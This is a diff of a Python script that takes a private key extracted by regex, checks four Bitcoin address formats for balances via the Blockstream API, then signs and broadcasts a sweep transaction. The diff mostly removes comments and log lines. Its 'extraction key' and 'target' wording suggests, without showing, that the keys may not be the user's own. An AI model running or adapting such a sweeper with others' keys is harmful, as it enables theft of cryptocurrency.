@@ -17,14 +17,13 @@ def inject_bitcoin_config():
     except: pass
 
 def broadcast_tx(raw_hex):
-    print("📡 [BROADCAST] Pushing transaction to Bitcoin Mainnet...")
+    print(" 📡 [BROADCAST] Pushing transaction to Bitcoin Mainnet...")
     try:
         resp = requests.post("https://blockstream.info/api/tx", data=raw_hex, timeout=15)
         if resp.status_code == 200:
             txid = resp.text.strip()
             print(f"\n✅ BROADCAST SUCCESSFUL!")
             print(f"📜 Transaction ID: {txid}")
-            print(f"🔗 View on Blockstream: https://blockstream.info/tx/{txid}")
             return txid
         else:
             print(f"❌ Broadcast Failed: {resp.status_code} - {resp.text}")
@@ -58,19 +57,12 @@ def run_btc_sweep():
         priv_key_hex = match.group(1)
         secret_int = int(priv_key_hex, 16)
 
-        # Derive Keys
         priv = PrivateKey(secret_exponent=secret_int)
-        
-        # Uncompressed
         pub_uncomp = priv.get_public_key()
         pub_uncomp.compressed = False
-        
-        # Compressed
         pub_comp = priv.get_public_key()
         pub_comp.compressed = True
 
-        # Generate Target Address Matrix
-        # Nested SegWit (P2SH-P2WPKH) - common for 2017-2020 era wallets
         redeem_script = Script(['OP_0', pub_comp.get_segwit_address().to_hash160()])
         p2sh_nested_addr = P2shAddress(redeem_script=redeem_script)
 
@@ -91,7 +83,6 @@ def run_btc_sweep():
             addr_str = addr_obj.to_string()
             print(f"   Checking {label}: {addr_str}...")
             
-            # First check balance summary
             addr_info = requests.get(f"https://blockstream.info/api/address/{addr_str}", timeout=10).json()
             funded = addr_info.get('chain_stats', {}).get('funded_txo_sum', 0) + addr_info.get('mempool_stats', {}).get('funded_txo_sum', 0)
             spent = addr_info.get('chain_stats', {}).get('spent_txo_sum', 0) + addr_info.get('mempool_stats', {}).get('spent_txo_sum', 0)
@@ -108,10 +99,8 @@ def run_btc_sweep():
 
         if not found_utxos:
             print("\n⚠️ Status: Zero balance detected across all 4 major address formats.")
-            print("Wait for mempool propagation or verify the extraction key.")
             return
 
-        # Transaction Building
         tx_inputs = []
         total_val = 0
         for u in found_utxos:
@@ -125,22 +114,18 @@ def run_btc_sweep():
         is_segwit = "SegWit" in active_label
         tx = Transaction(tx_inputs, tx_outputs, has_segwit=is_segwit)
 
-        # Signing
-        print(f"\n🔑 Signing for {active_label}...")
         if "Native SegWit" in active_label:
             script_code = active_pub.get_segwit_address().to_script_pub_key()
             for i, u in enumerate(found_utxos):
                 sig = priv.sign_segwit_input(tx, i, script_code, u['value'])
                 tx.witnesses.append([sig, active_pub.to_hex()])
         elif "Nested SegWit" in active_label:
-            # Nested SegWit needs both script_sig and witness
             script_code = active_pub.get_segwit_address().to_script_pub_key()
             for i, u in enumerate(found_utxos):
                 sig = priv.sign_segwit_input(tx, i, script_code, u['value'])
                 tx.witnesses.append([sig, active_pub.to_hex()])
                 tx_inputs[i].script_sig = Script([redeem_script.to_hex()])
         else:
-            # Legacy (Compressed/Uncompressed)
             for i in range(len(tx_inputs)):
                 sig = priv.sign_input(tx, i, active_addr_obj.to_script_pub_key())
                 tx_inputs[i].script_sig = Script([sig, active_pub.to_hex()])
@@ -150,9 +135,7 @@ def run_btc_sweep():
         broadcast_tx(signed_hex)
             
     except Exception as e:
-        import traceback
         print(f"❌ Execution Error: {e}")
-        traceback.print_exc()
 
 if __name__ == "__main__":
     run_btc_sweep()
